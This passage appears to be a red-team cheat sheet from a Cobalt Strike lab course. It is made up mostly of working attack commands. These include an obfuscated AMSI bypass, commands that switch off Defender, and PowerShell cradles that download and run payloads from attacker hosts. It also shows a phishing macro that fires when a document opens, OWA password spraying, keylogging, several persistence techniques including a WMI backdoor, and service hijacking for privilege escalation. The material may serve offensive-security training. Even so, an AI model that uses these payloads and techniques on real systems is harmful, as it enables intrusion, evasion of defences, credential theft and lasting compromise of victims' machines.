PS&gt; Get-ChildItem -Path <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Payloads\</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-File</span> | <span style=color:#66d9ef>ForEach</span>-Object { &amp; echo <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Testing file against ThreatCheck (AMSI): </span><span style=color:#e6db74>$</span><span style=color:#e6db74>_</span><span style=color:#e6db74>&#34;</span> ; C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Release\ThreatCheck.exe -e AMSI <span style=color:#f92672>-f</span> $_.FullName }

<span style=color:#75715e># Load the CNA file: Cobalt Strike &gt; Script Manager &gt; Load &gt; and select the CNA</span>
<span style=color:#75715e># Use Payloads &gt; Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`</span>

<span style=color:#75715e># Disable AMSI in Malleable C2 profile</span>
$ vim c2-profiles/normal/webbug.profile

<span style=color:#75715e># Right above the `http-get` block, add the following:</span>
post-ex {
        set amsi_disable <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>true</span><span style=color:#e6db74>&#34;</span>;
				set spawnto_x64 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%windir%\\sysnative\\dllhost.exe</span><span style=color:#e6db74>&#34;</span>;
				<span style=color:#75715e>#set spawnto_x64 &#34;%windir%\\System32\\dllhost.exe&#34;;</span>
        set spawnto_x86 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%windir%\\syswow64\\dllhost.exe</span><span style=color:#e6db74>&#34;</span>;
}

<span style=color:#75715e># Minimize the Behavioural Detections by modifying the Malleable c2 Profile</span>
stage {
        set userwx <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>false</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>#Allocate Beacon DLL as RW/RX rather than RWX.</span>
        set cleanup <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>true</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>#Free memory associated with reflective loader after it has been loaded</span>
        set obfuscate <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>true</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e># Load Beacon into memory without its DLL headers</span>
        set module_x64 <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>xpsservices.dll</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>#Load DLL from disk, then replace its memory with Beacon.</span>
}

<span style=color:#75715e># Verify the modified C2 profile</span>
attacker@ubuntu ~/cobaltstrike&gt; ./c2lint c2-profiles/normal/webbug.profile

<span style=color:#75715e># Creating custom C2 profiles</span>
https<span style=color:#960050;background-color:#1e0010>:</span>//unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/

<span style=color:#75715e># Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.</span>

<span style=color:#75715e># Behaviour Detections (change default process for fork &amp; run)</span>
beacon&gt; spawnto x64 <span style=color:#66d9ef>%</span>windir%\System32\taskhostw.exe
beacon&gt; spawnto x86 <span style=color:#66d9ef>%</span>windir%\syswow64\dllhost.exe

beacon&gt; spawnto x64 <span style=color:#66d9ef>%</span>windir%\System32\dllhost.exe
beacon&gt; spawnto x86 <span style=color:#66d9ef>%</span>windir%\syswow64\dllhost.exe
beacon&gt; powerpick Get-Process -Id $pid | select ProcessName

<span style=color:#75715e># Change the default process for psexec</span>
beacon&gt; ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon&gt; ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

<span style=color:#75715e># Disable Defender from local powershell session</span>
Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true

<span style=color:#75715e>## AMSI BYPASS -----------------------------------------------------------------</span>

<span style=color:#75715e># AMSI BYPASS :  Use AMSI Bypass with powershell payload if required, </span>
<span style=color:#75715e># Save below one liner to a ps1 file and host it on cobalt strike and use Powershell IEX to fetch and run it in memory to bypass AMSI.</span>

<span style=color:#75715e># Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command, So some methods in jump command which uses Powershell like psexec_psh , winrm and winrm64 will not work if payload is detected, So we musty have to use Custom AMSI Bypass script to avoid that and get a shell.</span>
<span style=color:#75715e># To make the jump command work and include amsi bypass into it, We need to modify the Resource kit&#39;s template.x86.ps1 (for winrm), template.x64.ps1 (for winrm64) and compress.ps1 (for psexec_psh).</span>
<span style=color:#75715e># To learn more , Read this blog - https://offensivedefence.co.uk/posts/making-amsi-jump/</span>

S`eT-It`em ( <span style=color:#e6db74>&#39;V&#39;</span>+<span style=color:#e6db74>&#39;aR&#39;</span> +  <span style=color:#e6db74>&#39;IA&#39;</span> + (<span style=color:#e6db74>&#39;blE:1&#39;</span>+<span style=color:#e6db74>&#39;q2&#39;</span>)  + (<span style=color:#e6db74>&#39;uZ&#39;</span>+<span style=color:#e6db74>&#39;x&#39;</span>)  ) ( <span style=color:#66d9ef>[TYpE]</span>(  <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{1}{0}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>-F</span><span style=color:#e6db74>&#39;F&#39;</span>,<span style=color:#e6db74>&#39;rE&#39;</span>  ) )  ;    (    Get-varI`A`BLE  ( (<span style=color:#e6db74>&#39;1Q&#39;</span>+<span style=color:#e6db74>&#39;2U&#39;</span>)  +<span style=color:#e6db74>&#39;zX&#39;</span>  )  -VaL  ).<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>A</span><span style=color:#e6db74>`</span><span style=color:#e6db74>ss</span><span style=color:#e6db74>`</span><span style=color:#e6db74>Embly</span><span style=color:#e6db74>&#34;</span>.<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>GET</span><span style=color:#ae81ff>`T</span><span style=color:#e6db74>Y</span><span style=color:#e6db74>`</span><span style=color:#e6db74>Pe</span><span style=color:#e6db74>&#34;</span>((  <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{6}{3}{1}{4}{2}{0}{5}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-f</span>(<span style=color:#e6db74>&#39;Uti&#39;</span>+<span style=color:#e6db74>&#39;l&#39;</span>),<span style=color:#e6db74>&#39;A&#39;</span>,(<span style=color:#e6db74>&#39;Am&#39;</span>+<span style=color:#e6db74>&#39;si&#39;</span>),(<span style=color:#e6db74>&#39;.Man&#39;</span>+<span style=color:#e6db74>&#39;age&#39;</span>+<span style=color:#e6db74>&#39;men&#39;</span>+<span style=color:#e6db74>&#39;t.&#39;</span>),(<span style=color:#e6db74>&#39;u&#39;</span>+<span style=color:#e6db74>&#39;to&#39;</span>+<span style=color:#e6db74>&#39;mation.&#39;</span>),<span style=color:#e6db74>&#39;s&#39;</span>,(<span style=color:#e6db74>&#39;Syst&#39;</span>+<span style=color:#e6db74>&#39;em&#39;</span>)  ) ).<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>g</span><span style=color:#e6db74>`</span><span style=color:#e6db74>etf</span><span style=color:#e6db74>`</span><span style=color:#e6db74>iElD</span><span style=color:#e6db74>&#34;</span>(  ( <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{0}{2}{1}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-f</span>(<span style=color:#e6db74>&#39;a&#39;</span>+<span style=color:#e6db74>&#39;msi&#39;</span>),<span style=color:#e6db74>&#39;d&#39;</span>,(<span style=color:#e6db74>&#39;I&#39;</span>+<span style=color:#e6db74>&#39;nitF&#39;</span>+<span style=color:#e6db74>&#39;aile&#39;</span>)  ),(  <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{2}{4}{0}{1}{3}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-f</span> (<span style=color:#e6db74>&#39;S&#39;</span>+<span style=color:#e6db74>&#39;tat&#39;</span>),<span style=color:#e6db74>&#39;i&#39;</span>,(<span style=color:#e6db74>&#39;Non&#39;</span>+<span style=color:#e6db74>&#39;Publ&#39;</span>+<span style=color:#e6db74>&#39;i&#39;</span>),<span style=color:#e6db74>&#39;c&#39;</span>,<span style=color:#e6db74>&#39;c,&#39;</span>  )).<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sE</span><span style=color:#ae81ff>`T</span><span style=color:#ae81ff>`V</span><span style=color:#e6db74>aLUE</span><span style=color:#e6db74>&#34;</span>(  ${n`ULl},${t`RuE} ) ; Start-Job -ScriptBlock{iex (iwr http<span style=color:#960050;background-color:#1e0010>:</span>//nickelviper.com/a -UseBasicParsing)}

<span style=color:#75715e># Like below</span>

powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://nickelviper.com/amsi-bypass.ps1&#39;)) ; IEX ((new-object net.webclient).downloadstring(&#39;http://nickelviper.com/a&#39;))</span><span style=color:#e6db74>&#34;</span>

<span style=color:#75715e># It can also be combined with Macro</span>

<span style=color:#75715e># Powershell Execute cradles</span>
iex (New-Object Net.WebClient).DownloadString(<span style=color:#e6db74>&#39;https://webserver/payload.ps1&#39;</span>)

powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>iex (iwr http://nickelviper.com/amsi-bypass.ps1 -UseBasicParsing)</span><span style=color:#e6db74>&#34;</span>

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate(<span style=color:#e6db74>&#39;http://192.168.230.1/evil.ps1
</span><span style=color:#e6db74>&#39;</span>);sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

PSv3 onwards

iex (iwr <span style=color:#e6db74>&#39;http://192.168.230.1/evil.ps1&#39;</span>)

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open(<span style=color:#e6db74>&#39;GET&#39;</span>,<span style=color:#e6db74>&#39;http://192.168.230.1/evil.ps1&#39;</span>,$false);$h.send();iex $h.responseText

$wr = <span style=color:#66d9ef>[System.NET.WebRequest]</span>::Create(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>http://192.168.230.1/evil.ps1</span><span style=color:#e6db74>&#34;</span>)
$r = $wr.GetResponse()
IEX (<span style=color:#66d9ef>[System.IO.StreamReader]</span>($r.GetResponseStream())).ReadToEnd()
</code></pre></div><h3 id=initial-compromise>Initial Compromise</h3><ul><li>Enumerating OWA to identify valid user and conducting password spraying attack</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Identify the mail server of given domain</span>
$ dig cyberbotic.io
$ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt

<span style=color:#75715e># Idenitfy the NETBIOS name of target domain</span>
ps&gt; ipmo C:\Tools\MailSniper\MailSniper.ps1
ps&gt; Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

<span style=color:#75715e># Extract Employee Names (FirstName LastName) and Prepare Username List</span>
$ ~/namemash.py names.txt &gt; possible.txt

<span style=color:#75715e># Validate the username to find active/real usernames</span>
ps&gt; Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

<span style=color:#75715e># Conduct Password Spraying attack with known Password on identified users</span>
ps&gt; Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

<span style=color:#75715e># Use Identified credentials to download Global Address List</span>
ps&gt; Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
</code></pre></div><ul><li>Create a malicious Office file having embedded macro</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Step 1: Open a blank word document &#34;Document1&#34;. Navigate to  View &gt; Macros &gt; Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing</span>

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>wscript.shell</span><span style=color:#e6db74>&#34;</span>)
  Shell.Run <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>notepad</span><span style=color:#e6db74>&#34;</span>

<span style=color:#66d9ef>End</span> Sub

<span style=color:#75715e># Step 2: Generate a payload for web delivery (Attacks &gt; Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes</span>

Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>wscript.shell</span><span style=color:#e6db74>&#34;</span>)
	Shell.Run <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>powershell.exe -nop -w hidden -c </span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://nickelviper.com/a&#39;))</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>&#34;</span>

<span style=color:#66d9ef>End</span> Sub

<span style=color:#75715e># Step 3: Save the document as .doc file and send it as phising email</span>

<span style=color:#75715e># AMSI BYPASS :  Use AMSI Bypass with above payload if required, </span>
<span style=color:#75715e># Save below one liner to a ps1 file and host it on cobalt strike and use Powershell IEX to fetch and run it in memory to bypass AMSI.</span>

S`eT-It`em ( <span style=color:#e6db74>&#39;V&#39;</span>+<span style=color:#e6db74>&#39;aR&#39;</span> +  <span style=color:#e6db74>&#39;IA&#39;</span> + (<span style=color:#e6db74>&#39;blE:1&#39;</span>+<span style=color:#e6db74>&#39;q2&#39;</span>)  + (<span style=color:#e6db74>&#39;uZ&#39;</span>+<span style=color:#e6db74>&#39;x&#39;</span>)  ) ( <span style=color:#66d9ef>[TYpE]</span>(  <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{1}{0}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>-F</span><span style=color:#e6db74>&#39;F&#39;</span>,<span style=color:#e6db74>&#39;rE&#39;</span>  ) )  ;    (    Get-varI`A`BLE  ( (<span style=color:#e6db74>&#39;1Q&#39;</span>+<span style=color:#e6db74>&#39;2U&#39;</span>)  +<span style=color:#e6db74>&#39;zX&#39;</span>  )  -VaL  ).<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>A</span><span style=color:#e6db74>`</span><span style=color:#e6db74>ss</span><span style=color:#e6db74>`</span><span style=color:#e6db74>Embly</span><span style=color:#e6db74>&#34;</span>.<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>GET</span><span style=color:#ae81ff>`T</span><span style=color:#e6db74>Y</span><span style=color:#e6db74>`</span><span style=color:#e6db74>Pe</span><span style=color:#e6db74>&#34;</span>((  <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{6}{3}{1}{4}{2}{0}{5}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-f</span>(<span style=color:#e6db74>&#39;Uti&#39;</span>+<span style=color:#e6db74>&#39;l&#39;</span>),<span style=color:#e6db74>&#39;A&#39;</span>,(<span style=color:#e6db74>&#39;Am&#39;</span>+<span style=color:#e6db74>&#39;si&#39;</span>),(<span style=color:#e6db74>&#39;.Man&#39;</span>+<span style=color:#e6db74>&#39;age&#39;</span>+<span style=color:#e6db74>&#39;men&#39;</span>+<span style=color:#e6db74>&#39;t.&#39;</span>),(<span style=color:#e6db74>&#39;u&#39;</span>+<span style=color:#e6db74>&#39;to&#39;</span>+<span style=color:#e6db74>&#39;mation.&#39;</span>),<span style=color:#e6db74>&#39;s&#39;</span>,(<span style=color:#e6db74>&#39;Syst&#39;</span>+<span style=color:#e6db74>&#39;em&#39;</span>)  ) ).<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>g</span><span style=color:#e6db74>`</span><span style=color:#e6db74>etf</span><span style=color:#e6db74>`</span><span style=color:#e6db74>iElD</span><span style=color:#e6db74>&#34;</span>(  ( <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{0}{2}{1}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-f</span>(<span style=color:#e6db74>&#39;a&#39;</span>+<span style=color:#e6db74>&#39;msi&#39;</span>),<span style=color:#e6db74>&#39;d&#39;</span>,(<span style=color:#e6db74>&#39;I&#39;</span>+<span style=color:#e6db74>&#39;nitF&#39;</span>+<span style=color:#e6db74>&#39;aile&#39;</span>)  ),(  <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{2}{4}{0}{1}{3}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-f</span> (<span style=color:#e6db74>&#39;S&#39;</span>+<span style=color:#e6db74>&#39;tat&#39;</span>),<span style=color:#e6db74>&#39;i&#39;</span>,(<span style=color:#e6db74>&#39;Non&#39;</span>+<span style=color:#e6db74>&#39;Publ&#39;</span>+<span style=color:#e6db74>&#39;i&#39;</span>),<span style=color:#e6db74>&#39;c&#39;</span>,<span style=color:#e6db74>&#39;c,&#39;</span>  )).<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>sE</span><span style=color:#ae81ff>`T</span><span style=color:#ae81ff>`V</span><span style=color:#e6db74>aLUE</span><span style=color:#e6db74>&#34;</span>(  ${n`ULl},${t`RuE} )

<span style=color:#75715e># Like below, It can also be combined with above Macro</span>

Shell.Run <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>powershell.exe -nop -w hidden -c </span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://nickelviper.com/amsi-bypass.ps1&#39;)) ; IEX ((new-object net.webclient).downloadstring(&#39;http://nickelviper.com/a&#39;))</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#e6db74>&#34;</span>
</code></pre></div><h3 id=host-reconnaissance>Host Reconnaissance</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Identify running process like AV, EDR or any monitoring and logging solution</span>
beacon&gt; ps
<span style=color:#75715e># Check default process for fork &amp; run</span>
beacon&gt; powerpick Get-Process -Id $pid | select ProcessName

<span style=color:#75715e># Use Seatbealt to enumerate about system</span>
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

<span style=color:#75715e># Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user</span>
beacon&gt; screenshot
beacon&gt; clipboard
beacon&gt; net logons

beacon&gt; keylogger
beacon&gt; job
beacon&gt; jobkill 3
</code></pre></div><h3 id=host-persistence-normal--privileged>Host Persistence (Normal + Privileged)</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Default location for powershell</span>
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

<span style=color:#75715e># Encode the payload for handling extra quotes </span>

<span style=color:#75715e># Powershell</span>
PS C:\&gt; $str = <span style=color:#e6db74>&#39;IEX ((new-object net.webclient).downloadstring(&#34;http://nickelviper.com/a&#34;))&#39;</span>
PS C:\&gt; <span style=color:#66d9ef>[System.Convert]</span>::ToBase64String(<span style=color:#66d9ef>[System.Text.Encoding]</span>::Unicode.GetBytes($str))

<span style=color:#75715e>#Linux </span>
$ echo -n <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.31/shell.ps1&#39;)</span><span style=color:#e6db74>&#34;</span> | iconv -t UTF-16LE | base64 -w 0

<span style=color:#75715e># Final Command</span>
powershell -nop -enc &lt;BASE64_ENCODED_PAYLOAD&gt;

<span style=color:#75715e># ---------------------------------------------------------------------------------</span>

<span style=color:#75715e># Common userland persistence methods include -</span>
<span style=color:#75715e># HKCU / HKLM Registry Autoruns,</span>
<span style=color:#75715e># Scheduled Tasks,</span>
<span style=color:#75715e># Startup Folder</span>

<span style=color:#75715e># CobaltStrike AggressorScripts for Persistence</span>
<span style=color:#75715e># Copy the aggressor script cna code and paste in the Attacker machine and also copy the sharpersist.exe from Attacker machine Tools and put in the same directory as of persistence cna file.</span>
https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/Peco602/cobaltstrike-aggressor-scripts/tree/main/persistence-sharpersist
<span style=color:#75715e># Tip : Windows Service Peristence with a onDisk Executable is most reliable in lab (Need Priv to configure)</span>

<span style=color:#75715e># Persistance - Task Scheduler</span>
<span style=color:#75715e># Persistance hourly</span>
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><span style=color:#e6db74>&#34;</span> -a <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA</span><span style=color:#e6db74>&#34;</span> -n <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Updater</span><span style=color:#e6db74>&#34;</span> -m add -o hourly
<span style=color:#75715e># Persistance on Logon (Need Admin Privileges)</span>
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><span style=color:#e6db74>&#34;</span> -a <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA</span><span style=color:#e6db74>&#34;</span> -n <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Updater</span><span style=color:#e6db74>&#34;</span> -m add -o logon

<span style=color:#75715e># Persistance - Startup Folder</span>
PS C:\&gt; $str = <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>IEX ((new-object net.webclient).downloadstring(&#39;http://nickelviper.com/amsi-bypass.ps1&#39;)) ; IEX ((new-object net.webclient).downloadstring(&#39;http://nickelviper.com/a&#39;))</span><span style=color:#e6db74>&#34;</span>
PS C:\&gt; <span style=color:#66d9ef>[System.Convert]</span>::ToBase64String(<span style=color:#66d9ef>[System.Text.Encoding]</span>::Unicode.GetBytes($str))
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><span style=color:#e6db74>&#34;</span> -a <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAbQBzAGkALQBiAHkAcABhAHMAcwAuAHAAcwAxACcAKQApACAAOwAgAEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACcAKQApAA==</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>-f</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>UserEnvSetup</span><span style=color:#e6db74>&#34;</span> -m add 

<span style=color:#75715e># Persistance - Registry Autorun</span>
beacon&gt; cd C:\ProgramData
beacon&gt; upload C:\Payloads\http_x64.exe
beacon&gt; mv http_x64.exe Updater.exe
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\ProgramData\Updater.exe</span><span style=color:#e6db74>&#34;</span> -a <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>/q /n</span><span style=color:#e6db74>&#34;</span> -k <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>hkcurun</span><span style=color:#e6db74>&#34;</span> -v <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Updater</span><span style=color:#e6db74>&#34;</span> -m add

<span style=color:#75715e># Persistance COM Hijacks</span>

<span style=color:#75715e># Persistance - Privilleged System User</span>

<span style=color:#75715e># Windows Service</span>
beacon&gt; cd C:\Windows
beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
beacon&gt; mv tcp-local_x64.svc.exe legit-svc.exe
beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\legit-svc.exe</span><span style=color:#e6db74>&#34;</span> -n <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>legit-svc</span><span style=color:#e6db74>&#34;</span> -m add

<span style=color:#75715e># Register WMI event to trigger our payload</span>
beacon&gt; cd C:\Windows
beacon&gt; upload C:\Payloads\dns_x64.exe
beacon&gt; powershell-import C:\Tools\PowerLurk.ps1
beacon&gt; powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Windows\dns_x64.exe</span><span style=color:#e6db74>&#34;</span> -Trigger ProcessStart -ProcessName notepad.exe

<span style=color:#75715e># TIP : Use a beacon with slow check-in and spawn a new Session from it , So that it can be later used as lifeline.</span>
beacon&gt; spawn x64 http
beacon&gt; inject 4464 x64 http
<span style=color:#75715e># Create a new Session (child of current process) using spawn or shspawn.</span>
beacon&gt; spawn x64 http
beacon&gt; shspawn x64 C:\Payloads\msf_http_x64.bin
<span style=color:#75715e># Inject a full Beacon payload for the specified listener using inject or shinject.</span>
beacon&gt; inject 4464 x64 tcp-local
beacon&gt; execute C:\Windows\System32\notepad.exe
beacon&gt; ps
beacon&gt; shinject &lt;PID&gt; x64 msf.bin
</code></pre></div><h3 id=host-privilege-escalation>Host Privilege Escalation</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Query and Manage all the installed services</span>
beacon&gt; powershell Get-Service | fl
beacon&gt; run wmic service get name, pathname
beacon&gt; run sc query
beacon&gt; run sc qc VulnService2
beacon&gt; run sc stop VulnService1
beacon&gt; run sc start VulnService1

<span style=color:#75715e># Use SharpUp to find exploitable services</span>
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 

<span style=color:#75715e># CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)</span>
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
beacon&gt; powershell Get-Acl -Path <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Program Files\Vulnerable Services</span><span style=color:#e6db74>&#34;</span> | fl
beacon&gt; cd C:\Program Files\Vulnerable Services
beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
beacon&gt; mv tcp-local_x64.svc.exe Service.exe
beacon&gt; run sc stop VulnService1
beacon&gt; run sc start VulnService1
beacon&gt; connect localhost 4444

<span style=color:#75715e># CASE 2: Weak Service Permission (Possible to modify service configuration)</span>
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon&gt; powershell-import C:\Tools\Get-ServiceAcl.ps1
beacon&gt; powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
beacon&gt; run sc qc VulnService2
beacon&gt; mkdir C:\Temp
beacon&gt; cd C:\Temp
beacon&gt; upload C:\Payloads\tcp-local_x64.svc.exe
beacon&gt; run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
beacon&gt; run sc qc VulnService2
beacon&gt; run sc stop VulnService2
beacon&gt; run sc start VulnService2
beacon&gt; connect localhost 4444

<span style=color:#75715e># CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)</span>
beacon&gt; execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
beacon&gt; powershell Get-Acl -Path <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Program Files\Vulnerable Services\Service 3.exe</span><span style=color:#e6db74>&#34;</span> | fl
PS C:\Payloads&gt; copy <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>tcp-local_x64.svc.exe</span><span style=color:#e6db74>&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Service 3.exe</span><span style=color:#e6db74>&#34;</span>
beacon&gt; run sc stop VulnService3
beacon&gt; cd <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>C:\Program Files\Vulnerable Services</span><span style=color:#e6db74>&#34;</span>
beacon&gt; upload C:\Payloads\Service3.exe
beacon&gt; run sc start VulnService3
beacon&gt; connect localhost 4444

<span style=color:#75715e># UAC Bypass</span>
beacon&gt; run whoami /groups
beacon&gt; elevate uac-schtasks tcp-local
beacon&gt; run netstat -anop tcp
beacon&gt; connect localhost 4444
